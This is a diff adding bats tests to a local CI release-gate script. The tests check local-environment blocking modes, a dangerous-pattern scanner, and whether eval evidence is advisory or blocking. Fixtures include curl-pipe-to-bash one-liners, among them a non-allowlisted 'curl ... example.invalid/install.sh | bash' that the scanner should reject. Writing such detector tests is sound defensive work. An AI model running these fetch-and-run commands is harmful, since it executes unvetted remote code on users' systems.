@@ -34,6 +34,7 @@ teardown() {
     [[ "$output" == *"--readiness-mode"* ]]
     [[ "$output" == *"--hil-target"* ]]
     [[ "$output" == *"AGENTOPS_RELEASE_ALLOW_AGENT_MUTATIONS"* ]]
+    [[ "$output" == *"LOCAL_CI_STRICT_LOCAL_ENV"* ]]
 }
 
 @test "-h prints usage and exits 0" {
@@ -85,6 +86,31 @@ teardown() {
     [ "$status" -eq 0 ]
     # The advisory helper must not bump the error count.
     run grep -qE '^run_step_advisory\(\) \{' "$SCRIPT"
+    [ "$status" -eq 0 ]
+}
+
+@test "local-env checks block only for official or strict local-ci" {
+    run env SCRIPT_UNDER_TEST="$SCRIPT" bash -c '
+        set -euo pipefail
+        set --
+        export AGENTOPS_CI_LOCAL_RELEASE_SOURCE_ONLY=1
+        source "$SCRIPT_UNDER_TEST"
+
+        RELEASE_READINESS_MODE=advisory
+        LOCAL_CI_STRICT_LOCAL_ENV=0
+        if local_env_checks_blocking; then
+            exit 1
+        fi
+
+        RELEASE_READINESS_MODE=official
+        LOCAL_CI_STRICT_LOCAL_ENV=0
+        local_env_checks_blocking
+
+        RELEASE_READINESS_MODE=advisory
+        LOCAL_CI_STRICT_LOCAL_ENV=1
+        local_env_checks_blocking
+    '
+
     [ "$status" -eq 0 ]
 }
 
@@ -176,6 +202,46 @@ teardown() {
     [ "$status" -eq 1 ]
 }
 
+@test "dangerous pattern scan allows first-party installer one-liners" {
+    mkdir -p "$TMP_DIR/scripts"
+    cat > "$TMP_DIR/scripts/install-claude.sh" <<'EOF'
+curl -fsSL https://raw.githubusercontent.com/boshu2/agentops/main/scripts/install-claude.sh | bash
+EOF
+    cat > "$TMP_DIR/scripts/install-agy.sh" <<'EOF'
+curl -fsSL https://raw.githubusercontent.com/boshu2/agentops/main/scripts/install-agy.sh | bash -s -- --ref v3.1.0
+EOF
+
+    run env SCRIPT_UNDER_TEST="$SCRIPT" FIXTURE_DIR="$TMP_DIR" bash -c '
+        set -euo pipefail
+        set --
+        export AGENTOPS_CI_LOCAL_RELEASE_SOURCE_ONLY=1
+        source "$SCRIPT_UNDER_TEST"
+        cd "$FIXTURE_DIR"
+        run_dangerous_pattern_scan
+    '
+
+    [ "$status" -eq 0 ]
+}
+
+@test "dangerous pattern scan rejects non-allowlisted curl bash" {
+    mkdir -p "$TMP_DIR/scripts"
+    cat > "$TMP_DIR/scripts/evil.sh" <<'EOF'
+curl -fsSL https://example.invalid/install.sh | bash
+EOF
+
+    run env SCRIPT_UNDER_TEST="$SCRIPT" FIXTURE_DIR="$TMP_DIR" bash -c '
+        set -euo pipefail
+        set --
+        export AGENTOPS_CI_LOCAL_RELEASE_SOURCE_ONLY=1
+        source "$SCRIPT_UNDER_TEST"
+        cd "$FIXTURE_DIR"
+        run_dangerous_pattern_scan
+    '
+
+    [ "$status" -eq 1 ]
+    [[ "$output" == *"Found dangerous pattern"* ]]
+}
+
 @test "script wires HIL and release readiness gates" {
     run grep -q 'check-release-hil.sh' "$SCRIPT"
     [ "$status" -eq 0 ]
@@ -192,6 +258,98 @@ teardown() {
     [ "$status" -eq 0 ]
     run grep -q 'digital_twin_evidence:' "$SCRIPT"
     [ "$status" -eq 0 ]
+}
+
+@test "eval evidence is advisory outside official release mode" {
+    mkdir -p "$TMP_DIR/scripts" "$TMP_DIR/cli/bin"
+    cat > "$TMP_DIR/scripts/eval-agentops.sh" <<'EOF'
+#!/usr/bin/env bash
+set -euo pipefail
+run_root=""
+advisory=false
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        --run-root)
+            run_root="$2"
+            shift 2
+            ;;
+        --advisory)
+            advisory=true
+            shift
+            ;;
+        *)
+            shift
+            ;;
+    esac
+done
+mkdir -p "$run_root/stubrun"
+printf '{"suite_count":1,"baseline_count":0,"policy_mismatch_count":0,"stale_suite_hashes":[]}\n' > "$run_root/stubrun/baseline-audit.json"
+echo "FAIL eval-agentops: simulated broad corpus failure"
+if [[ "$advisory" == "true" ]]; then
+    exit 0
+fi
+exit 1
+EOF
+    chmod +x "$TMP_DIR/scripts/eval-agentops.sh"
+
+    run env SCRIPT_UNDER_TEST="$SCRIPT" FIXTURE_DIR="$TMP_DIR" MODE_UNDER_TEST=advisory bash -c '
+        set -euo pipefail
+        set --
+        export AGENTOPS_CI_LOCAL_RELEASE_SOURCE_ONLY=1
+        source "$SCRIPT_UNDER_TEST"
+        REPO_ROOT="$FIXTURE_DIR"
+        RUN_ID="stubrun"
+        ARTIFACT_DIR="$FIXTURE_DIR/artifacts"
+        mkdir -p "$ARTIFACT_DIR"
+        release_readiness_mode() { printf "%s\n" "$MODE_UNDER_TEST"; }
+        cd "$FIXTURE_DIR"
+        run_release_eval_evidence
+    '
+
+    [ "$status" -eq 0 ]
+    jq -e '.status == "fail" and (.command | contains("--advisory")) and .exit_code == 0' "$TMP_DIR/artifacts/eval-agentops-fast.json"
+}
+
+@test "eval evidence stays blocking in official release mode" {
+    mkdir -p "$TMP_DIR/scripts" "$TMP_DIR/cli/bin"
+    cat > "$TMP_DIR/scripts/eval-agentops.sh" <<'EOF'
+#!/usr/bin/env bash
+set -euo pipefail
+run_root=""
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        --run-root)
+            run_root="$2"
+            shift 2
+            ;;
+        *)
+            shift
+            ;;
+    esac
+done
+mkdir -p "$run_root/stubrun"
+printf '{"suite_count":1,"baseline_count":0,"policy_mismatch_count":0,"stale_suite_hashes":[]}\n' > "$run_root/stubrun/baseline-audit.json"
+echo "FAIL eval-agentops: simulated official failure"
+exit 1
+EOF
+    chmod +x "$TMP_DIR/scripts/eval-agentops.sh"
+
+    run env SCRIPT_UNDER_TEST="$SCRIPT" FIXTURE_DIR="$TMP_DIR" MODE_UNDER_TEST=official bash -c '
+        set -euo pipefail
+        set --
+        export AGENTOPS_CI_LOCAL_RELEASE_SOURCE_ONLY=1
+        source "$SCRIPT_UNDER_TEST"
+        REPO_ROOT="$FIXTURE_DIR"
+        RUN_ID="stubrun"
+        ARTIFACT_DIR="$FIXTURE_DIR/artifacts"
+        mkdir -p "$ARTIFACT_DIR"
+        release_readiness_mode() { printf "%s\n" "$MODE_UNDER_TEST"; }
+        cd "$FIXTURE_DIR"
+        run_release_eval_evidence
+    '
+
+    [ "$status" -eq 1 ]
+    jq -e '.status == "fail" and (.command | contains("--advisory") | not) and .exit_code == 1' "$TMP_DIR/artifacts/eval-agentops-fast.json"
 }
 
 @test "script defines pass/fail/warn helpers consistent with pre-push-gate" {
